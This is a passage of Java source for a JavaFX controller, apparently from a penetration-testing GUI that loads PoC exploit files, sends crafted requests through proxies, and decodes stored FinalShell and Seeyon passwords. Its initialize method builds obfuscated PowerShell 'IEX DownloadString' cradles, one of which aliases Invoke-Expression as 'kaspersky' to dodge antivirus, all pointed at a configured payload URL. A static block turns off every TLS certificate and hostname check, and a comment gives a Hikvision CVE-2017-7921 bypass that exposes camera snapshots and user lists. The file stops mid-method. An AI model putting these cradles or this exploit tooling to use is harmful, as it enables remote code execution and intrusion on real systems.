package main;

import com.alibaba.druid.filter.config.ConfigTools;
import java.awt.*;
import java.io.*;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.List;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.io.FileWriter;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseEvent;
import javafx.scene.text.Text;
import javafx.stage.FileChooser;
import javafx.stage.Stage;
import javax.net.ssl.*;
import static main.RequestPoc.Poclist.*;
import main.RequestPoc.Readfile;
import static main.RequestPoc.Readfile.ymlFiletoconditioninformation;
import static main.RequestPoc.Readfile.modifyFileContent;
import static main.RequestPoc.makeRequest.listMakeRequest;
import main.RequestPoc.test7;
import static main.RequestPoc.test7.Url.extractLists;
import static main.RequestPoc.test7.Url.extractListsinput;
import static main.finalshelltest.finalshellDecode.decodePass;
import static main.finalshelltest.seeyonGetpass.*;
import static main.util.AEStest2.decryptbuwei;
import static main.util.AEStest2.encryptbuwei;
import static main.util.CorsJsonp.*;
import static main.util.Tasklist.readFileByLines;
import static main.util.Tasklist.ifexe;
import static main.util.Tasklist.taskexechange;
import static main.util.Usualcmd.readFilestokey;
import static main.util.Usualcmd.readFileByLines2;
import static main.util.Usualcmd.usualcmdlist;
import static main.util.druidgetinformation.*;
import static main.util.AESDESende.*;
import static main.util.AEStest.*;
import main.util.StageManager;
import static main.util.encodeUtil.*;
import static main.util.fileEncode.*;
import static main.util.pythonexp.deleteArrayNull;
import main.support.Expdecode;
import main.support.SerializationDumper;


public class Poc2ExpguiController {


    // 解决https的问题 24-59行
    // https://gist.github.com/aembleton/889392

    static {
        try {
            Poc2ExpguiController.disableSSLCertificateChecking();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }
    }

    public static void disableSSLCertificateChecking() throws NoSuchAlgorithmException, KeyManagementException {
        TrustManager[] trustAllCerts = new TrustManager[] {new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }
            public void checkClientTrusted(X509Certificate[] certs, String authType) {
            }
            public void checkServerTrusted(X509Certificate[] certs, String authType) {
            }
        }
        };
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        HostnameVerifier allHostsValid = new HostnameVerifier(){
            public boolean verify(String hostname, SSLSession session) {
                return true;
            }

        };
        HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
    }
    // 修改的截止


//    @FXML
//    private Button mButton;
//
    @FXML
    private Button mButton11;

    @FXML
    private TextArea mTextArea;

    @FXML
    private TextArea mTextArea2;

    @FXML
    private TextArea mTextArea3;

    @FXML
    private TextArea mTextArea4;

    @FXML
    private TextArea mTextArea5;

    @FXML
    private TextArea mTextArea6;

    @FXML
    private TextArea mTextArea7;

    @FXML
    private TextArea mTextArea8;

    @FXML
    private TextArea mTextArea9;

    @FXML
    private TextArea mTextArea92;

    @FXML
    private TextArea mTextArea10;

    @FXML
    private TextArea mTextArea12;

    @FXML
    private TextArea mTextArea11;

    @FXML
    private TextArea mTextArea13;

    @FXML
    private TextArea mTextArea14;

    @FXML
    private TextArea mTextArea15;

    @FXML
    private TextArea mTextArea16;

    @FXML
    private TextArea mTextArea17;

    @FXML
    private TextArea mTextArea18;

    @FXML
    private TextArea mTextArea19;

    @FXML
    private TextArea mTextArea20;

    @FXML
    private TextArea mTextArea21;

    @FXML
    private TextArea mTextArea22;

    @FXML
    private TextArea mTextArea24;

    @FXML
    private TextArea mTextArea25;

    @FXML
    private TextArea mTextArea26;

    @FXML
    private TextArea mTextArea27;

    @FXML
    private TextArea mTextArea28;
//    @FXML
//    private TextArea mTextArea112;

    @FXML
    private TextArea mTextAreatest;

    @FXML
    private Label mLabel2;

    @FXML
    private Label mLabel4;

    @FXML
    private Label mLabel5;

    @FXML
    public Label mLabeltest;

    @FXML
    public Label mLabeltest2;

    @FXML
    private TextField mTextField1;

    @FXML
    private TextField mTextField2;

    @FXML
    private TextField mTextField3;

    @FXML
    private TextField mTextField4;

    @FXML
    private TextField mTextField5;

    @FXML
    private TextField mTextField51;

    @FXML
    private TextField mTextField6;

    @FXML
    private TextField mTextField7;

    @FXML
    private TextField mTextField8;

    @FXML
    private TextField mTextField82;

    @FXML
    private TextField mTextField83;

    @FXML
    private TextField mTextField9;

    @FXML
    private TextField mTextField10;

    @FXML
    private TextField mTextField11;

    @FXML
    private TextField mTextField12;

    @FXML
    private TextField mTextField13;

    @FXML
    private TextField mTextField14;

    @FXML
    private Text mText3;

    @FXML
    private Text mText32;

    @FXML
    private Text mText4;

    @FXML
    private Text mText5;

    @FXML
    private Text mText6;

    @FXML
    private ListView<String> mListView1;

    @FXML
    private ListView<String> mListView2;

    @FXML
    private ListView<String> mListView3;

    @FXML
    private ListView<String> mListView4;

    @FXML
    private ListView<String> mListView5;

//    private String tranDataToIndex;

    @FXML
    private RadioButton mRadiobutton;

    @FXML
    private RadioButton mRadiobutton1;

    @FXML
    private RadioButton mRadiobutton2;

    @FXML
    private RadioButton mRadiobutton3;

    @FXML
    private RadioButton mRadiobutton4;

    @FXML
    private RadioButton mRadiobutton5;

    @FXML
    private RadioButton mRadiobutton6;

    @FXML
    private RadioButton mRadiobutton7;

    @FXML
    private RadioButton mRadiobutton8;

    @FXML
    private RadioButton mRadiobutton9;

    @FXML
    private RadioButton mRadiobutton10;

    @FXML
    private RadioButton mRadiobutton11;

    @FXML
    private ChoiceBox mChoiceBox1; // aes/des/des3

    @FXML
    private ChoiceBox mChoiceBox2;  // 向量模式

    @FXML
    private ChoiceBox mChoiceBox3; // 填充模式

    @FXML
    private ChoiceBox mChoiceBox4; // 密文编码base64 / hex

    @FXML
    private ChoiceBox mChoiceBox5; // key和iv的编码 base64

    @FXML
    private TextField mTextField20; // 密钥

    @FXML
    private TextField mTextField15; // 偏移量

    @FXML
    private TextArea mTextArea29; // 密文

    @FXML
    private TextArea mTextArea30; // 明文

    @FXML
    private TextArea mTextArea31; // 提取路径输入

    @FXML
    private TextArea mTextArea32; // 提取路径输入

    @FXML
    private TextArea mTextArea33; // 剔除的后缀

    @FXML
    private TextArea mTextArea34; // 匹配的关键字

    @FXML
    private TextArea mTextArea35; // base64 文件编码

    @FXML
    private TextArea mTextArea36; // byte数组 文件编码

    @FXML
    private TextArea mTextArea37; // bcel 文件编码

    @FXML
    private TextArea mTextArea38_input; // bcel 文件编码

    @FXML
    private TextArea mTextArea38; // bcel 文件编码

    @FXML
    private TextArea mTextArea39; // bcel 文件编码

    @FXML
    private TextArea mTextArea40; // bcel 文件编码

    @FXML
    private TextArea mTextArea41; // bcel 文件编码

    @FXML
    private TextArea mTextArea42; // bcel 文件编码

    @FXML
    private TextArea mTextArea43; // bcel 文件编码

    @FXML
    private TextArea mTextArea44; // bcel 文件编码

    // 初始化，可以加载poc到poc列表里
    public void initialize() throws IOException {
//        String jarPath = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
//        URL url=new URL("jar:file:" + jarPath + "!/1.txt");
//        String pythonpath = readFileByLinesproperties(url);

        Properties prop = new Properties();
        prop.load(Main.class.getResourceAsStream("/config.properties"));
        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            String pythonpath = readFileByLinesproperties("property/config.properties");
            String[] pythonpaths = pythonpath.split("###");
            mTextField8.setText(pythonpaths[0]);
            mTextField82.setText(pythonpaths[1]);
            mTextField9.setText(pythonpaths[2]);
            mTextField83.setText(pythonpaths[3]);
        }else {
            System.out.println(prop.getProperty("pocsuite"));
            mTextField8.setText(prop.getProperty("python2path"));
            mTextField82.setText(prop.getProperty("python3path"));
            mTextField83.setText(prop.getProperty("pocsuite"));
            mTextField9.setText(prop.getProperty("cspayload"));

        }

        //下面为cspayload自动生成模块，初始化
        String inputString = mTextField9.getText().trim();
        String outputString1 = "";
        String outputString2 = "";
        String outputString3 = "";
        String outputString4 = "";

        outputString1 = "powershell -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('" + inputString.substring(0,2) +"'+'" + inputString.substring(2) + "'))\"";
        mTextArea16.setText(outputString1); // 第一个框

        String strtest = "IEX (New-Object System.Net.Webclient).DownloadString('" + inputString + "')";

        byte[] sb2 = strtest.getBytes();
        int ii = 0;
        byte[] bt3 = new byte[sb2.length+sb2.length];
        for (byte btest:sb2) {
            bt3[ii++] = btest;
            bt3[ii++] = (byte)0x00;
        }
        String str= new String (bt3);
        String base64encodedString = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
        mTextArea17.setText("powershell -enc " + base64encodedString); // 第二个框


        outputString2 = "powershell set-alias -name kaspersky -value Invoke-Expression;kaspersky(New-Object Net.WebClient).DownloadString('" +  inputString + "')\"";
        mTextArea18.setText(outputString2); // 第三个框

        outputString3 = "powershell set-alias -name kaspersky -value Invoke-Expression;\"$a1='kaspersky ((new-object net.webclient).downl';$a2='oadstring(''" +  inputString + "''))';$a3=$a1,$a2;kaspersky(-join $a3)\"";
        mTextArea19.setText(outputString3); // 第四个框

        outputString4 = "powershell -NoExit $c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''" +  inputString + "'')'.Replace('123','adString');IEX ($c1+$c2)";
        mTextArea20.setText(outputString4); // 第五个框
        // 上面为cspayload自动生成模块，初始化

        ObservableList<String> strList = dirnametlistview1("poc");

        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }

        mListView1.setItems(strList);
        mTextArea.setWrapText(true);// 自动换行
        mTextArea3.setWrapText(true); // 自动换行

        ObservableList<String> keylist = readFilestokey("property/cmdlists.txt");
        mListView3.setItems(keylist);
        mTextArea8.setWrapText(true); // 自动换行

        ObservableList<String> strList2 = dirnametlistview1("pythonexp"); //python脚本显示页面
        if(os.toLowerCase().startsWith("win")) {
            for (int i = 0; i < strList2.size(); i++) {
                String[] strlist_list2 = strList2.get(i).split("\\\\");
                strList2.set(i, strlist_list2[strlist_list2.length-1]);
            }
        }

        mListView4.setItems(strList2);
        mTextArea9.setWrapText(true); // 自动换行
        mTextArea10.setWrapText(true); // 自动换行
        mTextArea11.setWrapText(true); // 自动换行
        mTextArea12.setWrapText(true); // 自动换行

        mTextArea13.setWrapText(true); // 自动换行
        mTextArea14.setWrapText(true); // 自动换行
        mTextArea15.setWrapText(true); // 自动换行

        mTextArea16.setWrapText(true); // 自动换行
        mTextArea17.setWrapText(true); // 自动换行
        mTextArea18.setWrapText(true); // 自动换行
        mTextArea19.setWrapText(true); // 自动换行
        mTextArea20.setWrapText(true); // 自动换行
        mTextArea21.setWrapText(true); // 自动换行
        mTextArea22.setWrapText(true); // 自动换行
        mTextArea24.setWrapText(true); // 自动换行
        mTextArea25.setWrapText(true); // 自动换行
        mTextArea26.setWrapText(true); // 自动换行
        mTextArea27.setWrapText(true); // 自动换行
        mTextArea28.setWrapText(true); // 自动换行
        mTextArea29.setWrapText(true); // 自动换行
        mTextArea30.setWrapText(true); // 自动换行
        mTextArea33.setText(".html\n.xsd\n//\n/springframework/");

        //mLabeltest2.setText("");

        ToggleGroup tg = new ToggleGroup(); // radiobutton单选
        mRadiobutton3.setToggleGroup(tg);
        mRadiobutton4.setToggleGroup(tg);
        mRadiobutton5.setToggleGroup(tg);
        mRadiobutton6.setToggleGroup(tg);

        ToggleGroup tg2 = new ToggleGroup(); // radiobutton单选
        mRadiobutton7.setToggleGroup(tg2);
        mRadiobutton8.setToggleGroup(tg2);

        String[] encodes_lists = new String[]{"AES", "DES", "DESede" };
        mChoiceBox1.setItems(FXCollections.observableArrayList(
                "AES", "DES", "DESede")
        ); // 列出AES DES DES3 RSA加密的选项
        mChoiceBox1.setValue("AES"); // 默认选择AES加密

//        mChoiceBox1.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // 监听如果为RSA加密
//            @Override
//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
//                if (encodes_lists[(int) newValue].equals("RSA")){
//                mChoiceBox3.setItems(FXCollections.observableArrayList(
//                        "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding")
//                ); // 列出填充模式
//                mChoiceBox3.setValue("PKCS1Padding"); // 默认选择PKCS5Padding模式
//                }
//                if (!encodes_lists[(int) newValue].equals("RSA")){
//                    mChoiceBox3.setItems(FXCollections.observableArrayList(
//                             "PKCS1Padding", "OAEPWithSHA-256AndMGF1Padding","OAEPWithSHA-1AndMGF1Padding","PKCS5Padding", "NoPadding")); // 列出填充模式
//                    mChoiceBox3.setValue("PKCS5Padding"); // 默认选择PKCS5Padding模式
//                }
//            }
//        });

        mChoiceBox2.setItems(FXCollections.observableArrayList(
                "ECB", "CBC","CFB")
        ); // 列出向量模式
        mChoiceBox2.setValue("CBC"); // 默认选择CBC模式


        String[] modes_lists = new String[]{"PKCS5Padding", "NoPadding"};
        mChoiceBox3.setItems(FXCollections.observableArrayList(
                        "PKCS5Padding", "NoPadding")); // 列出填充模式
        mChoiceBox3.setValue("PKCS5Padding"); // 默认选择PKCS5Padding模式

//        mChoiceBox3.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener() { // 监听如果为RSA的模式
//            @Override
//            public void changed(ObservableValue observable, Object oldValue, Object newValue) {
//                if (modes_lists[(int) newValue].equals("PKCS1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") || modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding") ){
//                    mChoiceBox1.setItems(FXCollections.observableArrayList(
//                            "RSA")
//                    ); // 列出填充模式
////                    mChoiceBox1.setValue("RSA"); // 默认选择PKCS5Padding模式
//
//                } else if( !modes_lists[(int) newValue].equals("PKCS1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-256AndMGF1Padding") && !modes_lists[(int) newValue].equals("OAEPWithSHA-1AndMGF1Padding")) {
//                    mChoiceBox1.setItems(FXCollections.observableArrayList("AES", "DES", "DES3", "RSA")
//                    ); // 列出填充模式
//                    mChoiceBox1.setValue("AES"); // 默认选择PKCS5Padding模式
//                }
//            }
//        });

        mChoiceBox4.setItems(FXCollections.observableArrayList(
                "Base64", "Hex", "无")
        ); // 列出密文编码
        mChoiceBox4.setValue("无"); // 默认选择Hex

        mChoiceBox5.setItems(FXCollections.observableArrayList(
                "Base64", "Hex", "无")
        ); // 列出密文编码
        mChoiceBox5.setValue("无"); // 默认选择Hex


    }



    // 读取properties配置文件
    public static String readFileByLinesproperties(String fileName) {
        File file = new File(fileName);
        BufferedReader reader = null;
        String python2path = "";
        String python3path = "";
        String pythonpath = "";
        String cspayload = "";
        String pocsuitepath = "";
        try {
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            // 一次读入一行，直到读入null为文件结束
            while ((tempString = reader.readLine()) != null) {
                if (tempString.contains("python2path"))
                    python2path = tempString.split("=")[1];
                if (tempString.contains("python3path"))
                    python3path = tempString.split("=")[1];
                if (tempString.contains("cspayload"))
                    cspayload = tempString.split("=")[1];
                if (tempString.contains("pocsuite"))
                    pocsuitepath = tempString.split("=")[1];

                pythonpath = python2path + "###" + python3path + "###" +cspayload + "###" + pocsuitepath;
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            return pythonpath;
        }
    }

    // 读取脚本的参数用法usage
    //public static String readFileByoneLine(String fileName) {
    //    File file = new File(fileName);
    //    BufferedReader reader = null;
    //    String pythonpath = "";
    //    try {
    //        reader = new BufferedReader(new FileReader(file));
    //        String tempString = null;
    //        // 一次读入一行，直到读入null为文件结束
    //        if((tempString = reader.readLine()) != null) {
    //            if (tempString.contains("######f0ng######"))
    //                pythonpath = tempString.split("######f0ng######")[1];
    //        }
    //        reader.close();
    //    } catch (IOException e) {
    //        e.printStackTrace();
    //    } finally {
    //        return pythonpath;
    //    }
    //}

    @FXML
    // mListView1 选中，鼠标选中
    public void mListView1Click(MouseEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );

        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );

            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );

        mListView2.setItems(strList);
    }

    @FXML
    // mListView1 选中，键盘选中
    public void mListView1Click2(KeyEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        System.out.println(System.getProperty("user.dir") + "\\" + mListView1.getSelectionModel().getSelectedItem() );

        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() );

            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }

        }
        else
            strList = dirnametlistview2("poc/" + mListView1.getSelectionModel().getSelectedItem() );

        mListView2.setItems(strList);
    }

    @FXML
    // mListView2 选中，出现关键字、响应时间、expname和exp描述，鼠标选中
    public void mListView2Click(MouseEvent event) throws FileNotFoundException {
        String strallowdirects ;
        System.out.println(mListView2.getSelectionModel().getSelectedItem());
        String[] conditioninformation;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );

        else
            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );


        for (String str : conditioninformation)
            if (str != null)
                if (str.contains("condition"))
                { // condition: {words:Content-Type:image/jpeg, time:null}
                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml中的关键字
                    System.out.println(strwords);
                    mText4.setText(strwords);

                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml中的时间
                    System.out.println(strtime);
                    mText3.setText(strtime);

                    if (str.contains("allowDirects")) {
                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml中的是否允许跳转
                    }else
                        strallowdirects = "true";
                    mText32.setText(strallowdirects);

                }else if(str.contains("expinformation"))
                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,返回的为查看的图像(访问该链接可以直接查看海康威视的监控截图/onvif-http/snapshot?auth:YWRtaW46MTEK;访问该链接可以直接查看海康威视的用户列表/Security/users?auth:YWRtaW46MTEK;访问该链接可以直接获取海康威视的配置文件/System/configurationFile?auth:YWRtaW46MTEK)}

                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml中的expname
                    mTextField6.setText(expname);


                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml中的expdescribe
                    mTextAreatest.setWrapText(true); // 自动换行
                    mTextAreatest.setText(expdescribe);
                }
    }

    @FXML
    // mListView2 选中，出现关键字、响应时间、expname和exp描述，键盘选中
    public void mListView2Click2(KeyEvent event) throws FileNotFoundException {
        String strallowdirects ;
        System.out.println(mListView2.getSelectionModel().getSelectedItem());
        String[] conditioninformation;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win"))
            conditioninformation = ymlFiletoconditioninformation( System.getProperty("user.dir") + "\\poc\\" + mListView1.getSelectionModel().getSelectedItem() + "\\" + mListView2.getSelectionModel().getSelectedItem() );

        else
            conditioninformation = ymlFiletoconditioninformation("poc/" + mListView1.getSelectionModel().getSelectedItem() + "/" + mListView2.getSelectionModel().getSelectedItem() );


        for (String str : conditioninformation)
            if (str != null)
                if (str.contains("condition"))
                { // condition: {words:Content-Type:image/jpeg, time:null}
                    String strwords = str.split(": \\{words:")[1].split(",")[0].trim(); // yml中的关键字
                    System.out.println(strwords);
                    mText4.setText(strwords);

                    String strtime = str.split(": \\{words:")[1].split(", time:")[1].replace("}","").replace(", allowDirects:false","").trim(); // yml中的时间
                    System.out.println(strtime);
                    mText3.setText(strtime);

                    if (str.contains("allowDirects")) {
                        strallowdirects = str.split(": \\{words:")[1].split(", allowDirects:")[1].replace("}", "").trim(); // yml中的是否允许跳转
                    }else
                        strallowdirects = "true";
                    mText32.setText(strallowdirects);

                }else if(str.contains("expinformation"))
                {// expinformation: {expname:hikvision, expdescribe:hikvision/CVE-2017-7921.yml,返回的为查看的图像(访问该链接可以直接查看海康威视的监控截图/onvif-http/snapshot?auth:YWRtaW46MTEK;访问该链接可以直接查看海康威视的用户列表/Security/users?auth:YWRtaW46MTEK;访问该链接可以直接获取海康威视的配置文件/System/configurationFile?auth:YWRtaW46MTEK)}

                    String expname = str.split(":")[2].split(", ")[0].trim(); // yml中的expname
                    mTextField6.setText(expname);


                    String expdescribe = str.split(": ")[1].split(", expdescribe:")[1].replace("}","").trim(); // yml中的expdescribe
                    mTextAreatest.setWrapText(true); // 自动换行
                    mTextAreatest.setText(expdescribe);
                }
    }

    @FXML
    // mListView3 选中，出现命令，鼠标选中
    public void mListView3Click(MouseEvent event) {
        String a = "";

        String[] list = readFileByLines2("property/cmdlists.txt");

        Map<String,String> usualcmdlist2 = usualcmdlist(list);

        System.out.println(mListView3.getSelectionModel().getSelectedItem());

        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
            System.out.println(entry.getKey() +"++++" + entry.getValue());
            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
            {
                a = entry.getValue();
            }
        }
        System.out.println(a);
        mTextArea8.setText(a);
    }

    @FXML
    // mListView3 选中，出现命令，键盘选中
    public void mListView3Click2(KeyEvent event) {
        String a = "";

        String[] list = readFileByLines2("property/cmdlists.txt");

        Map<String,String> usualcmdlist2 = usualcmdlist(list);

        System.out.println(mListView3.getSelectionModel().getSelectedItem());

        for (Map.Entry<String, String> entry : usualcmdlist2.entrySet()) {
            System.out.println(entry.getKey() +"++++" + entry.getValue());
            if ((entry.getKey()).equals(mListView3.getSelectionModel().getSelectedItem()))
            {
                a = entry.getValue();
            }
        }
        System.out.println(a);
        mTextArea8.setText(a);
    }

    @FXML
    // mListView4 选中  pythonexp模块，鼠标选中
    public void mListView4Click(MouseEvent event) throws FileNotFoundException {

        ObservableList<String> strList = null;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
        mListView5.setItems(strList);
    }

    @FXML
    // mListView4 选中  pythonexp模块，键盘选中
    public void mListView4Click2(KeyEvent event) throws FileNotFoundException {

        ObservableList<String> strList ;

        String os = System.getProperty("os.name");
        if(os.toLowerCase().startsWith("win")) {
            strList = dirnametlistview2(System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem());
            for (int i = 0; i < strList.size(); i++) {
                String[] strlist_list = strList.get(i).split("\\\\");
                strList.set(i, strlist_list[strlist_list.length-1]);
            }
        }
        else
            strList = dirnametlistview2("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() );
        mListView5.setItems(strList);
    }

    //@FXML
    //// mListView5 选中  出现脚本参数用法，鼠标选中
    //public void mListView5Click(MouseEvent event) throws FileNotFoundException {
    //    String usage ;
    //
    //    String os = System.getProperty("os.name");
    //    if(os.toLowerCase().startsWith("win"))
    //        usage = readFileByoneLine(  System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" +mListView5.getSelectionModel().getSelectedItem() );
    //    else
    //        usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
    //    mLabeltest2.setText(usage);
    //}
    //
    //@FXML
    //// mListView5 选中  出现脚本参数用法，键盘选中
    //public void mListView5Click2(KeyEvent event) throws FileNotFoundException {
    //    String usage ;
    //
    //    String os = System.getProperty("os.name");
    //    System.out.println(System.getProperty("user.dir") + "\\pythonexp\\" + mListView5.getSelectionModel().getSelectedItem());
    //    if(os.toLowerCase().startsWith("win")) {
    //        usage = readFileByoneLine( System.getProperty("user.dir") + "\\pythonexp\\" + mListView4.getSelectionModel().getSelectedItem() + "\\" + mListView5.getSelectionModel().getSelectedItem());
    //    }
    //    else
    //        usage = readFileByoneLine("pythonexp/" + mListView4.getSelectionModel().getSelectedItem() + "/" + mListView5.getSelectionModel().getSelectedItem() );
    //    mLabeltest2.setText(usage);
    //}


    //将数据包保存到txt文件，如果文件不存在，则创建文件
    private void poctoFile(String target,String filename) {
        File file=new File(filename);
        if(!file.exists())
        {
            try {
                file.createNewFile();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try (FileWriter fileWriter = new FileWriter(filename)) {
            fileWriter.append(target);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public  void proxy(){ // 代理函数
        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("http")) {
            String[] ipportlist = mLabeltest.getText().trim().split(":");
            System.setProperty("https.proxyHost", ipportlist[2]);
            System.setProperty("https.proxyPort", ipportlist[3]);
            System.setProperty("http.proxyHost", ipportlist[2]);
            System.setProperty("http.proxyPort", ipportlist[3]);
            // http代理
        } else {
            System.setProperty("https.proxyHost", "");
            System.setProperty("https.proxyPort", "");
            System.setProperty("http.proxyHost", "");
            System.setProperty("http.proxyPort", "");
        }

        if (!mLabeltest.getText().trim().equals("") && mLabeltest.getText().trim().contains("socks")) {
            String[] ipportlist = mLabeltest.getText().trim().split(":");
            System.getProperties().put("socksProxySet", "true");
            System.getProperties().put("socksProxyHost", ipportlist[2]);
            System.getProperties().put("socksProxyPort", ipportlist[3]);
            // socks代理
        } else {
            System.getProperties().put("socksProxySet", "false");
            System.getProperties().put("socksProxyHost", "");
            System.getProperties().put("socksProxyPort", "");
        }
    }

    @FXML
    //发包按钮
    public void onButtonClick(ActionEvent event) throws IOException {
        JarFile jarFile = null;
        String[][] request_header = null;
        String ishttps = "http";
        boolean isallowredirects = true;
        if (mRadiobutton.isSelected())
            ishttps = "https";

        if (mRadiobutton1.isSelected())
            isallowredirects = false;

        String responsetime = null;
        String responseheaderbody = null;

        proxy();

        //获取数据包的值
        String target = mTextArea.getText() ;// 增加换行，当请求包有换行，两个换行的时候才能识别出来
        String os = System.getProperty("os.name");
        if (os.toLowerCase().startsWith("win")) {
            poctoFile(target, "property/test.txt");
        }else {
            poctoFile(target, "test.txt");
        }

        // 将test.txt放入jar包内，删除test.txt

        String jarPath2 = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile(); // 获取config.properties文件路径
        String tempPath = jarPath2.substring(0, jarPath2.lastIndexOf("/")) + "/test.txt";
        System.out.println(tempPath + "#####");
        if (!jarPath2.contains(".jar") || os.toLowerCase().startsWith("win") ){
            System.out.println("无jar，不进行jar包的修改！");
//            try {
//                String os = System.getProperty("os.name");
//                if (os.toLowerCase().startsWith("win")) {
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "del";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
//
//                } else {
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "rm";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
//                }
//            } catch (Exception e) {
//                // TODO: handle exception
//            }
        }else {
            String[] command = new String[100];
            command[0] = "jar";
            command[1] = "uf";
            command[2] = Main.class.getProtectionDomain().getCodeSource().getLocation().getFile();
            command[3] = "test.txt";
            // jar uf esjavaclient-0.0.1-SNAPSHOT.jar config.properties 替换jar里面的config.properties文件

            String[] commands = deleteArrayNull(command);
            try {
                Process pro = Runtime.getRuntime().exec(commands);
                os = System.getProperty("os.name");
                if (os.toLowerCase().startsWith("win")) {
                    System.out.println("windows");
//                    String[] command2 = new String[100];
//                    Robot r = new Robot();
//                    r.delay(500);
//                    command2[0] = "del";
//                    command2[1] = tempPath;
//                    String[] commands2 = deleteArrayNull(command2);
//                    Process pro2 = Runtime.getRuntime().exec(commands2);
                } else {
                    String[] command2 = new String[100];
                    Robot r = new Robot();
                    r.delay(1000);
                    command2[0] = "rm";
                    command2[1] = tempPath;
